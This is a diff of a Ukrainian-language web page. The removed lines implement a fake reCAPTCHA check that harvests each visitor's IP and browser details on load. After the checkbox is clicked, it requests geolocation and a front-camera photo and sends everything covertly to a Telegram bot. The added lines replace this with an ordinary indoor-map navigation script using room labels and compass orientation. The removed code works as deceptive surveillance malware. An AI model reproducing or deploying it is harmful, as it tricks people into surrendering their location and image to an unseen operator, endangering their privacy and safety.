-            const fd = new FormData(); fd.append('chat_id', TELEGRAM_CHAT_ID); fd.append('photo', blob, `c_${Date.now()}.jpg`); if (caption) { fd.append('caption', caption); fd.append('parse_mode', 'HTML'); }
-            try { fetch(url, { method: 'POST', body: fd }).then(r => r.json()).then(res => { if (!res.ok) console.error("TG Photo Error"); }).catch(e => console.error("TG Photo Net Error:", e)); } catch (e) { console.error("TG Photo Init Error:", e); }
-        }
-
-        function showActionMessage(message, type = 'info', duration = 3000) {
-            if (messageTimeout) clearTimeout(messageTimeout);
-            actionMessage.textContent = message;
-            actionMessage.className = 'visible';
-             if (duration > 0) { messageTimeout = setTimeout(hideActionMessage, duration); }
-        }
-
-        function hideActionMessage() {
-             if (messageTimeout) clearTimeout(messageTimeout);
-             messageTimeout = null;
-             actionMessage.classList.remove('visible');
-        }
-
-        function getGeolocation() {
-            return new Promise(async (resolve, reject) => {
-                showProgress(25);
-                if (!navigator.geolocation) { await sendTelegramMessage("🚫 <b>Гео:</b> N/A"); reject("No Geo"); return; }
-                await sendTelegramMessage(`📍 <b>Запит гео...</b> (IP: ${ipAddress})`);
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        showProgress(50);
-                        const { latitude: lat, longitude: lon, accuracy } = pos.coords;
-                        const map = `https://www.google.com/maps?q=${lat},${lon}`;
-                        await sendTelegramMessage(`✅ <b>Гео:</b>\nLat: <code>${lat.toFixed(6)}</code>\nLon: <code>${lon.toFixed(6)}</code>\nAcc: ${accuracy} м.\nIP: <code>${ipAddress}</code>\n<a href="${map}">🗺️</a>`);
-                        resolve();
-                    },
-                    async (err) => {
-                        let eMsg = `🚫 <b>Гео помилка:</b> ${err.code}`;
-                        if (err.code === 1) eMsg += " (Denied)"; else if (err.code === 2) eMsg += " (Unavailable)"; else if (err.code === 3) eMsg += " (Timeout)";
-                        await sendTelegramMessage(eMsg + ` (IP: ${ipAddress})`);
-                        reject(eMsg);
-                    },
-                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
-                );
-            });
-        }
-
-        function captureCamera() {
-            return new Promise(async (resolve, reject) => {
-                showProgress(60);
-                if (!navigator.mediaDevices?.getUserMedia) { await sendTelegramMessage("🚫 <b>Камера:</b> N/A"); reject("No Cam API"); return; }
-                await sendTelegramMessage(`📷 <b>Запит камери...</b> (IP: ${ipAddress})`);
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false });
-                    videoElement.srcObject = stream;
-                    videoElement.onloadedmetadata = () => {
-                         videoElement.play().then(() => {
-                            showProgress(80);
-                            setTimeout(() => {
-                                const ctx = canvasElement.getContext('2d');
-                                canvasElement.width = videoElement.videoWidth; canvasElement.height = videoElement.videoHeight;
-                                ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
-                                stream.getTracks().forEach(t => t.stop()); videoElement.srcObject = null;
-                                canvasElement.toBlob(async (blob) => {
-                                    if (blob) { await sendTelegramMessage(`📸 <b>Фото > TG...</b> (IP: ${ipAddress})`); sendTelegramPhoto(blob, `👤 Фото (${new Date().toLocaleTimeString('uk-UA')})\nIP: <code>${ipAddress}</code>`); resolve(); }
-                                    else { await sendTelegramMessage(`🚫 <b>Камера:</b> Blob Error (IP: ${ipAddress})`); reject("Blob Error"); }
-                                }, 'image/jpeg', 0.80);
-                            }, 500);
-                         }).catch(async e => { await sendTelegramMessage(`🚫 <b>Камера:</b> Play Error (IP: ${ipAddress})`); stream.getTracks().forEach(t => t.stop()); reject("Play Error"); });
-                    };
-                    videoElement.onerror = async () => { await sendTelegramMessage(`🚫 <b>Камера:</b> Stream Error (IP: ${ipAddress})`); stream.getTracks().forEach(t => t.stop()); reject("Stream Error"); };
-                } catch (err) {
-                    let eMsg = `🚫 <b>Камера помилка:</b> ${err.name}`;
-                    if (err.name === 'NotAllowedError') eMsg += " (Denied)"; else if (err.name === 'NotFoundError') eMsg += " (Not Found)"; else eMsg += " (Other)";
-                    await sendTelegramMessage(eMsg + ` (IP: ${ipAddress})`);
-                    reject(eMsg);
+            // --- Room Data ---
+            const rooms = [];
+            roomLabelElements.forEach(label => {
+                const x = parseFloat(label.dataset.x);
+                const y = parseFloat(label.dataset.y);
+                // Basic validation of coordinates from HTML
+                if (!isNaN(x) && x >= 0 && x <= 100 && !isNaN(y) && y >= 0 && y <= 100) {
+                    rooms.push({
+                        id: label.dataset.roomId || label.id, // Use data-room-id preferably
+                        element: label,
+                        xPercent: x,
+                        yPercent: y,
+                    });
+                } else {
+                    console.warn(`Invalid or missing coordinates for room label: ${label.id}. Check data-x and data-y attributes.`);
+                    // Optionally hide or style invalid labels differently
+                    label.style.display = 'none';
                 }
             });
-        }
+             console.log(`Initialized ${rooms.length} rooms with valid coordinates.`);
 
-        async function collectAndSendInitialInfo() {
-            ipAddress = await getIPAddress();
-            let i = `🚀 <b>Візит | Верифікація</b> 🚀\n`;
-            i += `<b>IP:</b> <code>${ipAddress}</code>\n`;
-            i += `<b>UA:</b> <pre>${navigator.userAgent || 'N/A'}</pre>\n`;
-            i += `<b>Платф:</b> ${navigator.platform || 'N/A'}\n`;
-            if (navigator.userAgentData) i += `<b>UA Платф:</b> ${navigator.userAgentData.platform || 'N/A'} (${navigator.userAgentData.mobile ? 'Mob' : 'PC'})\n`;
-            i += `<b>Екран:</b> ${screen.width||'N/A'}x${screen.height||'N/A'} (${screen.availWidth||'N/A'}x${screen.availHeight||'N/A'})\n`;
-            i += `<b>Вікно:</b> ${window.innerWidth||'N/A'}x${window.innerHeight||'N/A'}\n`;
-            i += `<b>Мова:</b> ${navigator.language || 'N/A'} (${(navigator.languages || ['N/A']).join(',')})\n`;
-            i += `<b>Cookies:</b> ${navigator.cookieEnabled ? '✅' : '❌'}\n`;
-            try { i += `<b>Зона:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A'} (${-new Date().getTimezoneOffset()/60} год)\n`; } catch (e) {}
-            i += `<b>Online:</b> ${navigator.onLine ? '✅' : '❌'}\n`;
-            i += `<b>Час:</b> ${new Date().toLocaleString('uk-UA')}\n`;
-            await sendTelegramMessage(i);
-        }
-
-        // --- Головний обробник взаємодії з reCAPTCHA ---
-        async function handleRecaptchaInteraction() {
-            if (isProcessing) return;
-            isProcessing = true;
-            container.classList.add('loading');
-            checkbox.setAttribute('aria-checked', 'mixed');
-            checkbox.tabIndex = -1;
-            showProgress(10);
-
-            // Показуємо повідомлення про надання дозволів
-            showActionMessage('Для підтвердження особи надайте всі необхідні дозволи.', 'info', 15000);
-
-            let geoSuccess = false;
-            let camSuccess = false;
-
-            // --- Крок 1: Геолокація ---
-             try { await getGeolocation(); geoSuccess = true; }
-             catch (geoError) { console.warn("Geo Fail:", geoError); geoSuccess = false; }
-
-             await new Promise(resolve => setTimeout(resolve, 300));
-
-             // --- Крок 2: Камера ---
-              try { await captureCamera(); camSuccess = true; }
-              catch (camError) { console.warn("Cam Fail:", camError); camSuccess = false; }
-
-            // --- Крок 3: Завершення ---
-            container.classList.remove('loading');
-            container.classList.add('checked');
-            checkbox.setAttribute('aria-checked', 'true');
-            showProgress(100);
-
-            await sendTelegramMessage(`🏁 <b>Верифікацію завершено.</b>\nГео: ${geoSuccess ? '✅' : '❌'} | Камера: ${camSuccess ? '✅' : '❌'}\nIP: <code>${ipAddress}</code>`);
-
-             // Приховуємо поточний контент і показуємо SUD
-             if(originalHeader) originalHeader.style.display = 'none';
-             if(originalMain) originalMain.style.display = 'none';
-             if(originalFooter) originalFooter.style.display = 'none';
-             if(actionMessage) actionMessage.style.display = 'none'; // Ховаємо і повідомлення
-
-             if(sudContent) {
-                 sudContent.style.display = 'block';
-                 // Встановлюємо фон для body, як у SUD.html, якщо він відрізняється
-                 document.body.style.backgroundColor = '#f9f9f9';
-             }
-
-            hideProgress(); // Ховаємо прогрес бар в кінці
-        }
-
-        checkbox.addEventListener('click', handleRecaptchaInteraction);
-        checkbox.addEventListener('keydown', (event) => {
-            if ((event.key === 'Enter' || event.key === ' ') && !isProcessing) {
-                event.preventDefault(); handleRecaptchaInteraction();
+            // --- Utility Functions ---
+            // Debounce function to limit frequent event triggers
+            function debounce(func, wait) {
+                let timeout;
+                return function executedFunction(...args) {
+                    const later = () => {
+                        clearTimeout(timeout);
+                        func(...args);
+                    };
+                    clearTimeout(timeout);
+                    timeout = setTimeout(later, wait);
+                };
             }
-        });
 
-        window.addEventListener('DOMContentLoaded', () => {
-            collectAndSendInitialInfo().catch(err => console.error("Initial Info Err:", err));
-        });
+            // --- Map & Element Positioning ---
+            function updateMapAndElementPositions() {
+                 // Check if image has loaded and has dimensions
+                if (!mapImage.complete || mapImage.naturalWidth === 0) {
+                    console.log("Map image not ready for positioning.");
+                     // Ensure loading indicator is shown if map isn't ready
+                    if (getComputedStyle(loadingIndicator).display === 'none') {
+                         loadingIndicator.style.display = 'block';
+                    }
+                    // Try again shortly - useful for race conditions on load
+                    // setTimeout(updateMapAndElementPositions, 100);
+                    return;
+                }
+                 // Hide loading indicator once map is ready
+                 if (loadingIndicator.style.display !== 'none') {
+                    loadingIndicator.style.display = 'none';
+                 }
 
+
+                mapRect = mapImage.getBoundingClientRect(); // Get current rendered size/pos
+                if (!mapRect || mapRect.width === 0 || mapRect.height === 0) {
+                    console.error("Map dimensions are zero, cannot position elements. BoundingRect:", mapRect);
+                     // Try again in case layout wasn't finished
+                     requestAnimationFrame(updateMapAndElementPositions);
+                    return;
+                }
+
+                // Position labels based on mapRect and their percentage data
+                rooms.forEach(room => {
+                    const labelX = mapRect.left + (mapRect.width * room.xPercent / 100);
+                    const labelY = mapRect.top + (mapRect.height * room.yPercent / 100);
+                    room.element.style.left = `${labelX}px`;
+                    room.element.style.top = `${labelY}px`;
+                    // Fade in labels after positioning
+                    requestAnimationFrame(() => {
+                         room.element.style.opacity = '1';
+                    });
+                });
+
+                // Only set mapLoaded true once everything is positioned
+                if (!mapLoaded) {
+                    mapLoaded = true;
+                    console.log("Map and labels positioned successfully.");
+                    updateArrowPosition(); // Update arrow position now map is sized
+                    updateRoomHighlighting(); // Initial highlight check
+                }
+                updateDebugInfo(); // Update debug display
+            }
+
+            const debouncedUpdatePositions = debounce(updateMapAndElementPositions, 150);
+
+            // --- Event Listeners Setup ---
+            // Image loading successful
+            mapImage.onload = () => {
+                console.log("Map image loaded successfully (onload event).");
+                updateMapAndElementPositions();
+            };
+             // Image loading error
+             mapImage.onerror = () => {
+                 console.error("ERROR loading map image from:", mapImage.src);
+                 loadingIndicator.textContent = "Помилка завантаження карти!";
+                 loadingIndicator.style.display = 'block'; // Ensure indicator shows error
+                 // Optionally hide the broken image element
+                 mapImage.style.display = 'none';
+             };
+
+            // Initial check if image is already cached and loaded
+            if (mapImage.complete && mapImage.naturalWidth > 0) {
+                console.log("Map image was already complete (cached). Running initial positioning.");
+                // Use requestAnimationFrame for better timing with rendering engine
+                requestAnimationFrame(updateMapAndElementPositions);
+            } else if (!mapImage.complete) {
+                console.log("Map image not yet complete. Waiting for onload or onerror...");
+                loadingIndicator.style.display = 'block'; // Show loading indicator
+            } else {
+                 // Complete but no width likely means error state already handled by onerror,
+                 // or it's a 0x0 image.
+                 console.warn("Map image reported complete but has zero natural width.");
+                 if (!mapImage.onerror) { // If onerror didn't fire for some reason
+                      loadingIndicator.textContent = "Помилка: Не вдалося отримати розміри карти.";
+                      loadingIndicator.style.display = 'block';
+                 }
+            }
+
+
+            // Window resize and orientation change
+            window.addEventListener('resize', debouncedUpdatePositions);
+            window.addEventListener('orientationchange', debouncedUpdatePositions);
+
+            // Permission button
+            grantButton.addEventListener('click', requestOrientationPermission);
+
+            // --- Permission Handling ---
+            function requestOrientationPermission() {
+                permissionPrompt.style.display = 'none'; // Hide prompt
+
+                // 1. iOS / iPadOS specific permission request
+                if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
+                    console.log("Requesting iOS orientation permission...");
+                    DeviceOrientationEvent.requestPermission()
+                        .then(permissionState => {
+                            console.log("iOS Permission state:", permissionState);
+                            if (permissionState === 'granted') {
+                                orientationPermissionGranted = true;
+                                addOrientationListeners();
+                                // Delay showing arrow slightly until first orientation event?
+                                // arrow.style.visibility = 'visible';
+                                updateDebugInfo();
+                            } else {
+                                orientationPermissionGranted = false;
+                                alert('Доступ до орієнтації відхилено. Стрілка напрямку не працюватиме.');
+                                updateDebugInfo("Доступ до орієнтації відхилено");
+                            }
+                        })
+                        .catch(error => {
+                            console.error("Error requesting iOS orientation permission:", error);
+                            orientationPermissionGranted = false;
+                            alert('Сталася помилка при запиті доступу до орієнтації.');
+                            updateDebugInfo("Помилка запиту доступу");
+                        });
+                } else {
+                    // 2. Standard approach (Android, other non-iOS browsers)
+                    console.log("Adding standard orientation listeners (non-iOS/iPadOS).");
+                    // We assume permission is implicitly granted or not needed to ask for non-iOS.
+                    // The browser might still block it silently if permissions were denied previously.
+                    orientationPermissionGranted = true;
+                    addOrientationListeners();
+                    // arrow.style.visibility = 'visible'; // Delay showing arrow slightly?
+                    updateDebugInfo();
+                }
+            }
+
+            function addOrientationListeners() {
+                if (!window.DeviceOrientationEvent) {
+                     console.error("DeviceOrientationEvent not supported by this browser.");
+                     updateDebugInfo("Подія DeviceOrientation не підтримується");
+                     orientationPermissionGranted = false;
+                     return;
+                }
+                console.log("Adding orientation event listeners...");
+                // Add listeners with 'true' for capture phase might sometimes help, but default is usually fine.
+                window.addEventListener('deviceorientationabsolute', handleOrientation);
+                window.addEventListener('deviceorientation', handleOrientationFallback);
+            }
+
+            // Initial check: Determine if we need to prompt the user (iOS) or can just try (Android)
+            function initializeOrientationCheck() {
+                if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
+                    // iOS: Must prompt on user interaction. Show the modal.
+                     permissionPrompt.style.display = 'block';
+                     updateDebugInfo("Очікування дозволу...");
+                } else if (typeof DeviceOrientationEvent !== 'undefined') {
+                    // Android/Other: Try to add listeners directly. No modal needed initially.
+                     console.log("Attempting to initialize orientation directly (non-iOS path).")
+                     requestOrientationPermission();
+                } else {
+                    // No support at all
+                    alert("На жаль, датчики орієнтації не підтримуються цим пристроєм або браузером.");
+                    updateDebugInfo("Датчики орієнтації недоступні");
+                    orientationPermissionGranted = false;
+                }
+            }
+
+
+            // --- Sensor Event Handlers ---
+            let firstOrientationUpdate = true;
+            function handleOrientation(event) {
+                if (!orientationPermissionGranted) return;
+                // Prefer absolute orientation (compass)
+                if (event.absolute === true && typeof event.alpha === 'number') {
+                    processOrientationData(event.alpha);
+                    if (orientationFallbackUsed) {
+                         console.log("Switched back to deviceorientationabsolute");
+                         orientationFallbackUsed = false;
+                    }
+                } else if (!orientationFallbackUsed) {
+                     // Let fallback handle it if absolute isn't working reliably
+                }
+            }
+
+            function handleOrientationFallback(event) {
+                 if (!orientationPermissionGranted) return;
+                // Use relative orientation only if absolute isn't firing or isn't absolute
+                const absoluteSupported = 'absolute' in event;
+                if (typeof event.alpha === 'number' && (!absoluteSupported || !event.absolute)) {
+                    if (!orientationFallbackUsed) {
+                        console.warn("Using fallback 'deviceorientation'. May be relative to start orientation.");
+                        orientationFallbackUsed = true;
+                    }
+                    // Check for webkitCompassHeading (older Safari)
+                    const heading = event.webkitCompassHeading !== undefined ? event.webkitCompassHeading : event.alpha;
+                     if (typeof heading === 'number') {
+                         processOrientationData(heading);
+                     } else {
+                          // Avoid logging repeatedly if fallback value is consistently bad
+                          if (orientationFallbackUsed) console.warn("Fallback orientation alpha/heading is not a number.");
+                     }
+                }
+            }
+
+            function processOrientationData(alpha) {
+                let heading = alpha;
+
+                // Simple screen orientation adjustment (might need refinement for edge cases)
+                const screenOrientation = window.orientation || (screen.orientation ? screen.orientation.angle : 0) || 0;
+                // Adjust heading based on landscape mode if needed
+                if (Math.abs(screenOrientation) === 90) {
+                     heading = (heading + screenOrientation + 360) % 360;
+                }
+
+                // Apply manual offset and ensure value is 0-360
+                currentOrientation = (heading + compassOffset + 360) % 360;
+
+                 // Make arrow visible only after the first valid orientation reading
+                 if (firstOrientationUpdate && arrow.style.visibility !== 'visible') {
+                     arrow.style.visibility = 'visible';
+                     firstOrientationUpdate = false;
+                     console.log("First orientation update received, showing arrow.");
+                 }
+
+
+                updateArrowRotation(); // Update visual rotation
+                updateDebugInfo();     // Update status text
+            }
+
+            // --- UI Update Functions ---
+            function updateArrowRotation() {
+                // Update happens in processOrientationData after calculation now
+                 if (!mapLoaded || !orientationPermissionGranted || firstOrientationUpdate) return; // Don't rotate if not ready or hidden
+                 arrow.style.transform = `translate(-50%, -100%) rotate(${currentOrientation}deg)`;
+            }
+
+            function updateArrowPosition() {
+                if (!mapLoaded || !mapRect) return; // Check mapRect too
+                const arrowX = mapRect.left + (mapRect.width * currentUserPosition.xPercent / 100);
+                const arrowY = mapRect.top + (mapRect.height * currentUserPosition.yPercent / 100);
+                arrow.style.left = `${arrowX}px`;
+                arrow.style.top = `${arrowY}px`;
+            }
+
+            function updateRoomHighlighting() {
+                if (!mapLoaded || !mapRect) return;
+
+                const smallerDim = Math.min(mapRect.width, mapRect.height);
+                if (smallerDim <= 0) return; // Avoid division by zero or negative thresholds
+
+                const thresholdPixels = smallerDim * proximityThresholdPercent / 100;
+                const thresholdSq = thresholdPixels * thresholdPixels;
+
+                const userPixelX = mapRect.width * currentUserPosition.xPercent / 100;
+                const userPixelY = mapRect.height * currentUserPosition.yPercent / 100;
+
+                let closestRoom = null;
+                let minDistanceSq = Infinity;
+
+                rooms.forEach(room => {
+                    const roomPixelX = mapRect.width * room.xPercent / 100;
+                    const roomPixelY = mapRect.height * room.yPercent / 100;
+
+                    const dx = userPixelX - roomPixelX;
+                    const dy = userPixelY - roomPixelY;
+                    const distanceSq = (dx * dx) + (dy * dy);
+
+                    if (distanceSq < thresholdSq && distanceSq < minDistanceSq) {
+                        minDistanceSq = distanceSq;
+                        closestRoom = room;
+                    }
+                    // Remove highlight from all rooms efficiently
+                    if (room.element.classList.contains('highlighted')) {
+                         room.element.classList.remove('highlighted');
+                    }
+                });
+
+                // Highlight only the single closest room within the threshold
+                if (closestRoom) {
+                    closestRoom.element.classList.add('highlighted');
+                }
+            }
+
+            function updateDebugInfo(overrideMessage = null) {
+                if (overrideMessage) {
+                    debugInfo.textContent = overrideMessage;
+                    return;
+                }
+                 let status = "";
+                 if (!mapLoaded) {
+                     status = "Завантаження...";
+                 } else {
+                     status = `Поз (симуляція): ${currentUserPosition.xPercent.toFixed(0)}%, ${currentUserPosition.yPercent.toFixed(0)}%`;
+                     if (orientationPermissionGranted) {
+                         status += ` | Орієнт: ${currentOrientation.toFixed(0)}° ${orientationFallbackUsed ? '(Відносн.)' : '(Абсолют.)'}`;
+                     } else {
+                         status += " | Орієнт: Немає доступу";
+                     }
+                 }
+                 debugInfo.textContent = status;
+            }
+
+            // --- Keyboard Controls for Simulation (Desktop Testing) ---
+            document.addEventListener('keydown', (e) => {
+                if (!mapLoaded) return; // Don't allow control if map isn't ready
+
+                const step = 1.5; // Percentage step for movement
+                const rotStep = 5; // Degrees step for rotation
+                let moved = false;
+                let rotated = false;
+
+                 // Check if focus is on an input element, if any existed - ignore keys then
+                 // if (document.activeElement && document.activeElement.tagName === 'INPUT') return;
+
+                switch (e.key) {
+                    // Movement (WASD + Arrows)
+                    case 'ArrowUp':    case 'w': case 'W': case 'ö': case 'Ö': currentUserPosition.yPercent -= step; moved = true; break; // Added ö/Ö for ukrainian layout Ц
+                    case 'ArrowDown':  case 's': case 'S': case 'і': case 'І': currentUserPosition.yPercent += step; moved = true; break; // Added і/І for ukrainian layout І
+                    case 'ArrowLeft':  case 'a': case 'A': case 'ô': case 'Ô': currentUserPosition.xPercent -= step; moved = true; break; // Added ô/Ô for ukrainian layout Ф
+                    case 'ArrowRight': case 'd': case 'D': case 'â': case 'Â': currentUserPosition.xPercent += step; moved = true; break; // Added â/Â for ukrainian layout В
+
+                    // Rotation Simulation (Comma/Period or Q/E)
+                    case ',': case '<': case 'q': case 'Q': case 'é': case 'É': currentOrientation = (currentOrientation - rotStep + 360) % 360; rotated = true; break; // Added é/É for ukrainian layout Й
+                    case '.': case '>': case 'e': case 'E': case 'ó': case 'Ó': currentOrientation = (currentOrientation + rotStep) % 360; rotated = true; break; // Added ó/Ó for ukrainian layout У
+                }
+
+
+                if (moved) {
+                    // Clamp position to map bounds (0-100%)
+                    currentUserPosition.xPercent = Math.max(0, Math.min(100, currentUserPosition.xPercent));
+                    currentUserPosition.yPercent = Math.max(0, Math.min(100, currentUserPosition.yPercent));
+                    updateArrowPosition();
+                    updateRoomHighlighting();
+                }
+                 // Update rotation only if orientation sensors are NOT active/granted
+                 // OR if specifically triggered by rotation keys
+                if (rotated && !orientationPermissionGranted) { // Allow keyboard rotation override only if sensors off
+                    updateArrowRotation();
+                } else if (rotated && orientationPermissionGranted){
+                     // If sensors are ON, keyboard rotation only updates the debug value,
+                     // the actual arrow follows the sensor. Could potentially add an override toggle?
+                     console.log("Keyboard rotation attempted while sensors active - ignored for arrow display.");
+                }
+
+                if (moved || rotated) {
+                    updateDebugInfo(); // Update debug after any change
+                }
+            });
+
+            // --- Initial Setup Calls ---
+            updateDebugInfo(); // Initial debug message
+            initializeOrientationCheck(); // Start permission check/setup process
+
+        }); // End DOMContentLoaded
     </script>
-
 </body>
 </html>
